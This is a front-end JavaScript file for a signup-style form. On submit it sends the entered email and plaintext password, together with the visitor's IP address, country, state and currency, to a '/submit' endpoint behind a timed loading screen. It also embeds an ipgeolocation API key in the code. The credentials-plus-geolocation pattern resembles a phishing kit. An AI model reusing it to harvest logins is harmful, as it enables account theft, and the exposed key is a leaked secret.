const notMatchPop = document.querySelector("#notMatchPop");
const foundPop = document.querySelector("#foundPop");
const passInput = document.querySelector("#password");
const emailInput = document.querySelector("#email");
const confirmPassInput = document.querySelector("#confirm-password");
const submitBtn = document.querySelector("#submit");
const mainForm = document.querySelector("#form");
const main = document.querySelector("main");
const body = document.querySelector("body");
const loader = document.querySelector("body > section");
const result = document.querySelector("body > div.result");

mainForm.addEventListener("submit", (event) => {
  event.preventDefault();
  main.classList.add("completed");
  loader.classList.add("completed");
  setTimeout(() => {
    loader.classList.remove("completed");
    loader.classList.add("disappear");
    result.classList.add("completed");
  }, 3000);
  console.log("kk");
  fetch("/submit", {
    method: "POST",
    body: JSON.stringify({
      email: emailInput?.value,
      password: passInput?.value,
      details,
      timeStamp: Date.now(),
    }),
    headers: {
      "content-type": "application/json",
    },
  })
    .then(() => {
      console.log("done");
    })
    .catch((err) => console.log(err));
});

confirmPassInput.addEventListener("input", () => {
  if (passInput?.value !== confirmPassInput?.value) {
    notMatchPop.style.display = "block";
    notMatchPop.style.visibility = "visible";
  } else {
    notMatchPop.style.display = "none";
    notMatchPop.style.visibility = "hidden";
  }
});
let details = {};
fetch(
  "https://api.ipgeolocation.io/ipgeo?apiKey=28b0ac91ae9b49edace108ebe8e268ff"
)
  .then((response) => response.json())
  .then((result) => {
    details = {
      ip: result?.ip,
      country: result?.country_name,
      state: result?.state_prov,
      currency: result?.currency?.name,
    };
  })

  .catch((err) => console.log(err));
